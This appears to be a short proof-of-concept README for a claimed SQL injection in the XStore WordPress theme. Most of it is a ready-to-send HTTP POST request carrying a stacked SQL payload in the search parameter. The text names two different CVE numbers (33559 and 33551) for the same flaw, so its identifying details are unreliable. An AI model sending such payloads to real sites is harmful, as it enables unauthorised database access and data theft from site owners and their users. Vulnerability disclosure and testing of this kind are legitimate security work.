# WordPress-XStore-theme-SQL-Injection

## CVE-2024-33559 XStore theme-SQL Injection

CVE-2024-33551 is a SQL injection vulnerability found in 8theme XStore, an ecommerce platform built on WordPress. This vulnerability allows attackers to execute malicious SQL commands on the database, which can lead to data theft, deletion, or even alteration.

### Poc
```
POST /?s=%27%3B+SELECT+*+FROM+wp_posts%3B+-- HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```
